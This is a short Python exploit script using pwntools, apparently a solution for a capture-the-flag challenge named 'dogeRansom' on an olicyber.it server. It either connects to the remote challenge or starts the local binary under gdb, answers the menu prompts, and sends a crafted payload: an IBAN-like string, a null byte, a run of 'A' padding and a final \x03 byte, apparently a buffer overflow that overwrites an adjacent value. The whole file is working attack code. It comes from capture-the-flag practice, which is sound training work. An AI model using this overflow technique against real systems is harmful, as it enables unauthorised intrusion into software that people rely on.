#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    r = remote('dogeransom.challs.olicyber.it', 10804)
else:
    r = gdb.debug('./dogeRansom', '''
       b *main
       continue   
    ''')

r.recvuntil('\n\n> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030\x00' + b'A' * (49-28) + b'\x03')
r.interactive()